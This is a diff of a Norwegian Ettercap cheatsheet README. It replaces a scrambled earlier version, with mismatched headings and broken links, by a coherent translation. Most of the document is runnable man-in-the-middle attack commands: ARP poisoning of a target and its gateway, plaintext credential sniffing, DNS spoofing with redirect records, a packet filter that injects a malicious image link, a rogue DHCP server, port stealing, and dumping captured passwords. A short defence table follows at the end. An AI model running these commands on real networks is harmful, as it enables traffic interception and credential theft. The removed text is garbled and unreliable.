@@ -1,48 +1,51 @@
-# 🔍 Ettercap – komplett hurtigreferanse
-
 <!-- language-home-navigation -->
-[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)
+[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)
 
-
-[Ettercap](https://www.ettercap-project.org/) is a comprehensive suite for man-in-the-middle (MITM) attacks on local area networks (LAN). It features sniffing of live connections, content filtering on the fly, active and passive dissection of many protocols, and support for ARP poisoning, ICMP redirects, DHCP spoofing, and port stealing.
+[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)
 
 ---
 
-## 📋 Innholdsfortegnelse
 
-- [[DHCP Spoofing & Port Stealing](#dhcp-spoofing--port-stealing)](#core-architecture--modes)
-- [Installasjon](#installation--quick-setup)
-- [Verify configuration file locations:](#arp-poisoning--sniffing)
-- [3. Only Passive Sniffing](#dns-spoofing-attacks)
+# Ettercap Cheatsheet
+
+[Ettercap](https://www.ettercap-project.org/) er en omfattende pakke for man-in-the-middle (MITM)-angrep på lokalnettverk (LAN). Den har sniffing av direkteforbindelser, innholdsfiltrering i farten, aktiv og passiv disseksjon av mange protokoller, og støtte for ARP-forgiftning, ICMP-omdirigeringer, DHCP-spoofing og porttyveri.
+
+---
+
+## Innholdsfortegnelse
+
+- [Kjernearkitektur og moduser](#kjernearkitektur--moduser)
+- [Installasjon og hurtigoppsett](#installation--quick-setup)
+- [ARP-forgiftning og sniffing](#arp-forgiftning--sniffing)
+- [DNS-spoofing-angrep](#dns-spoofing-attacks)
 - [Custom Packet Filtering (`etterfilter`)](#custom-packet-filtering-etterfilter)
-- [DHCP Spoofing & Port Stealing](#dhcp-spoofing--port-stealing)
-- [2. Port Stealing Attack (Switch Flooding / CAM Table Abuse)](#logging--packet-extraction)
-- [Defensive Detection & Countermeasures](#defensive-detection--countermeasures)
+– [DHCP-forfalskning og porttyveri](#dhcp-spoofing--port-stealing)
+- [Logging og pakkeutvinning](#logging--pakkeutvinning)
+- [Defensiv deteksjon og mottiltak](#defensiv-deteksjon--mottiltak)
 
 ---
 
-## [DHCP Spoofing & Port Stealing](#dhcp-spoofing--port-stealing)
+## Kjernearkitektur og moduser
 
-[Defensive Detection & Countermeasures](#defensive-detection--countermeasures)
-- **`-T` (Text mode)**: Lightweight, non-curses terminal output ideal for scripting and headless automation.
-- **`-C` (Curses mode)**: Ncurses-based terminal UI for interactive operations without X11.
-- **`-G` (GTK mode)**: Full graphical interface.
-- **`-D` (Daemon mode)**: Runs silently in the background.
+Ettercap støtter flere utførelsesmoduser:
+- **`-T` (tekstmodus):** Lett, ikke-forbannet terminalutgang ideell for skripting og hodeløs automatisering.
+- **`-C` (Curses-modus):** Ncurses-basert terminalgrensesnitt for interaktive operasjoner uten X11.
+- **`-G` (GTK-modus):** Fullt grafisk grensesnitt.
+- **`-D` (Daemon-modus):** Kjører stille i bakgrunnen.
 
-Ettercap supports multiple execution modes:
+Målspesifikasjonssyntaks:
 ```text
 /MAC/IPs/IPv6/PORTs
 ```
-- `-C` (Curses mode)**: Ncurses-based terminal UI for interactive operations without X11.
-- `-G` (GTK mode)**: Full graphical interface.
-- `-D` (Daemon mode)**: Runs silently in the background.
+- Mål kan være kommaseparert eller IP-områder: `//` matcher alt.
+- Eksempel: `/192.168.1.50/` målretter IP `192.168.1.50` på alle porter.
+- Eksempel: `//80,443/` retter seg mot alle verter på portene 80 og 443.
 
 ---
 
-## Installasjon
-
+## Installasjon og hurtigoppsett
 ```bash
 # Debian / Ubuntu / Kali Linux
 sudo apt-get update && sudo apt-get install -y ettercap-text-only ettercap-graphical
@@ -53,66 +56,62 @@ sudo pacman -S ettercap
 # Enable IP forwarding on the host system
 sudo sysctl -w net.ipv4.ip_forward=1
 ```
-
-Verify configuration file locations:
-- `/etc/ettercap/etter.conf`: Core network and privilege drop configuration.
-- Installasjon
+Bekreft plassering av konfigurasjonsfilen:
+- `/etc/ettercap/etter.conf`: Konfigurasjon av kjernenettverk og rettighetsslipp.
+- `/etc/ettercap/etter.dns`: Oppslagstabell for DNS-spoofing-poster.
 
 ---
 
-## Verify configuration file locations:
+## ARP-forgiftning og sniffing
 
-### `/etc/ettercap/etter.dns`: DNS spoofing records lookup table.
-Poison ARP tables between a target workstation and the network gateway:
+### 1. Toveis ekstern ARP-forgiftning
+Poison ARP-tabeller mellom en målarbeidsstasjon og nettverksporten:
 ```bash
 sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1//
 ```
-- `-T`: Text mode.
-- ARP Poisoning & Sniffing
-- `-i eth0`: Listening and injection network interface.
-- 1. Two-Way Remote ARP Poisoning
+- `-T`: Tekstmodus.
+- `-q`: Stille modus (reduserer ordlyd, viser kun innhentet legitimasjon).
+- `-i eth0`: Lytte- og injeksjonsnettverksgrensesnitt.
+- `-M arp:remote`: Utfør toveis mann-i-midten ARP-forgiftning.
 
-### 2. Whole Subnet Sniffing (One-Way / Broadcast)
-`-T`: Text mode.
+### 2. Sniffing av hele undernettet (enveis / kringkasting)
+Forgift alle verter på subnettet mot standard gateway:
 ```bash
 sudo ettercap -T -q -i eth0 -M arp:remote // /192.168.1.1//
 ```
-
-### `-M arp:remote`: Perform bidirectional man-in-the-middle ARP poisoning.
-Capture plaintext credentials passing through the current host without ARP spoofing:
+### 3. Bare passiv sniffing
+Registrer legitimasjon i ren tekst som går gjennom den gjeldende verten uten ARP-spoofing:
 ```bash
 sudo ettercap -T -q -i eth0
 ```
-
 ---
 
-## 3. Only Passive Sniffing
+## DNS-spoofing-angrep
 
-Ettercap includes built-in plugins, including `dns_spoof`.
+Ettercap inkluderer innebygde plugins, inkludert `dns_spoof`.
 
-### Step 1: Configure `/etc/ettercap/etter.dns`
-Add wildcard or specific domain redirection:
+### Trinn 1: Konfigurer `/etc/ettercap/etter.dns`
+Legg til jokertegn eller spesifikk domeneomadressering:
 ```text
 # Redirect target domain to attacker machine
 target.corp.local      A   192.168.1.100
 *.target.corp.local    A   192.168.1.100
 microsoft.com          A   192.168.1.100
 ```
-
-### Ettercap includes built-in plugins, including `dns_spoof`.
+### Trinn 2: Start Ettercap med DNS-plugin
 ```bash
 sudo ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /192.168.1.50// /192.168.1.1//
 ```
-- Step 1: Configure `/etc/ettercap/etter.dns`
-- Add wildcard or specific domain redirection:
+- `-P dns_spoof`: Aktiverer DNS-spoofing-plugin.
+- Avlyttede DNS-spørringer som samsvarer med `etter.dns` returnerer angriperens IP.
 
 ---
 
-## Custom Packet Filtering (`etterfilter`)
+## Egendefinert pakkefiltrering (`etterfilter`)
 
-Intercepted DNS queries matching `etter.dns` return the attacker IP.
+Ettercap tillater pakkeinspeksjon i sanntid og endring av nyttelast ved å bruke tilpassede filterskript.
 
-### 1. Write Filter Script (`replace_img.filter`)
+### 1. Skriv filterskript (`replace_img.filter`)
 ```text
 if (ip.proto == TCP && tcp.dst == 80) {
     if (search(DATA.data, "Accept-Encoding")) {
@@ -125,46 +124,42 @@ if (ip.proto == TCP && tcp.src == 80) {
     msg("[*] Injected malicious image link!\n");
 }
 ```
-
-### 2. Compile Filter with `etterfilter`
+### 2. Kompiler filter med `etterfilter`
 ```bash
 etterfilter replace_img.filter -o replace_img.ef
 ```
-
-### 1. Write Filter Script (`replace_img.filter`)
+### 3. Kjør med Filter
 ```bash
 sudo ettercap -T -q -i eth0 -F replace_img.ef -M arp:remote /192.168.1.50// /192.168.1.1//
 ```
-
 ---
 
-## DHCP Spoofing & Port Stealing
+## DHCP-spoofing og porttyveri
 
 ### 1. Rogue DHCP Server Attack
-Respond faster than the legitimate DHCP server to assign rogue gateway and DNS addresses:
+Svar raskere enn den legitime DHCP-serveren for å tildele falske gateway- og DNS-adresser:
 ```bash
 sudo ettercap -T -i eth0 -M dhcp:192.168.1.200-250/255.255.255.0/192.168.1.1
 ```
-- Syntax: `dhcp:<ip_pool_start-end>/<netmask>/<dns_ip>`
+- Syntaks: `dhcp:<ip_pool_start-end>/<netmask>/<dns_ip>`
 
-### 2. Port Stealing Attack (Switch Flooding / CAM Table Abuse)
-1. Rogue DHCP Server Attack
+### 2. Port-tyveri-angrep (Switch Flooding / CAM-tabellmisbruk)
+Stjele trafikk på byttede nettverk der ARP-forgiftning er blokkert eller varslet:
 ```bash
 sudo ettercap -T -q -i eth0 -M port /192.168.1.50// /192.168.1.1//
 ```
-
 ---
 
-## 2. Port Stealing Attack (Switch Flooding / CAM Table Abuse)
+## Logging og pakkeutvinning
 
-### Save Raw Captured Sessions
+### Lagre Rå-fangede økter
 ```bash
 sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1// -w capture.pcap -L ettercap_log
 ```
-- `-w capture.pcap`: Write raw pcap packet data.
-- `-L ettercap_log`: Write dissected human-readable text logs.
+- `-w capture.pcap`: Skriv rå pcap-pakkedata.
+- `-L ettercap_log`: Skriv dissekerte menneskelesbare tekstlogger.
 
-### Convert Binary Logs with `etterlog`
+### Konverter binære logger med `etterlog`
 ```bash
 # Print captured credentials and passwords
 etterlog -p ettercap_log.eci
@@ -172,14 +167,13 @@ etterlog -p ettercap_log.eci
 # Extract traffic in pcap format
 etterlog -c -F TCP:192.168.1.50:80 ettercap_log.ecp -w http_session.pcap
 ```
-
 ---
 
-## Defensive Detection & Countermeasures
+## Defensiv deteksjon og mottiltak
 
-|Vector|Detection & Defense Mechanism|
+| Vektor | Deteksjons- og forsvarsmekanisme |
 |---|---|
-|**ARP Spoofing**|Enable Dynamic ARP Inspection (DAI) on managed switches; inspect `arp -a` for duplicate MACs; run `arpwatch` or `arpon`.|
-|**DNS Spoofing**|Enforce DNSSEC, DoH (DNS-over-HTTPS), or DoT (DNS-over-TLS).|
-|**DHCP Spoofing**|Enable DHCP Snooping on switches to designate trusted uplink ports.|
-|**Port Stealing**|Implement 802.1X Network Access Control (NAC) and port security with MAC limits per switch port.|
+| **ARP-spoofing** | Aktiver Dynamic ARP Inspection (DAI) på administrerte brytere; inspiser `arp -a` for dupliserte MAC-er; kjør `arpwatch` eller `arpon`. |
+| **DNS-spoofing** | Håndhev DNSSEC, DoH (DNS-over-HTTPS) eller DoT (DNS-over-TLS). |
+| **DHCP-forfalskning** | Aktiver DHCP-snooping på brytere for å angi pålitelige opplink-porter. |
+| **Porttyveri** | Implementer 802.1X Network Access Control (NAC) og portsikkerhet med MAC-grenser per svitsjport. |
